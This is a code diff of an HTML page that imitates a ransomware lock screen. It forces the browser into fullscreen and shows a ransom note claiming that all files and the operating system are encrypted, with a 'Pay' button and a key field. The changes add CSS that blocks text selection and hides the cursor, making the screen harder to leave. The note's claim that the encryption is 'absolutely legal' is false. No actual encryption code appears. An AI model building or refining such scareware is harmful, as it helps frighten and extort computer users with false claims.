@@ -1,4 +1,6 @@
 <meta charster="UTF-8">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
 <script>
 function fullscreen(element) {
 if(element.requestFullScreen) {
@@ -22,6 +24,7 @@ body.innerHTML = `<div class="trap">
 </script>
 <button onclick = "fullscreen(document.documentElement)">TRAFFIC STOCK CLOUD ENCRYPTOR VERSION 2.1.90 PREFIX 424</button>
 <body>
+<div class = "element">
 <h1>ATTENTION!!!</h1>
 <p> 
    All your personal data, photos, videos, work files, including your operating system have been encrypted and can be accessed again if you pay a ransome. You can't access anything on this machine but this screen.
@@ -34,11 +37,22 @@ You might be looking for a way to recover your files but don't waste your time. 
 You can purchase your key using one of the payment methods listed below. You will get a code to paste in the input field and click Decrypt. After this you should be restored in a couple of minutes.
 
 Is This Legal?
-Someone who has access to this computar has recently installed one of our free applications and agreed for the files to be encrypted by accepting the terms and conditions. This procedure is absolutely legal, we are a certified and awarded company specialized in computer viruses and digital identity theft. We will send you an invoice for your payment.
+Someone who has access to this computer has recently installed one of our free applications and agreed for the files to be encrypted by accepting the terms and conditions. This procedure is absolutely legal, we are a certified and awarded company specialized in computer viruses and digital identity theft. We will send you an invoice for your payment.
 </p>
 <p><input type = "password"></p><button onclick ="worry()">Pay</button>
+</div>
 </body>
 <style>
+.element{
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+    -khtml-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+    cursor:none;
+    background:gray;
+}
 h1 {
 	size:60px;
         color:red;
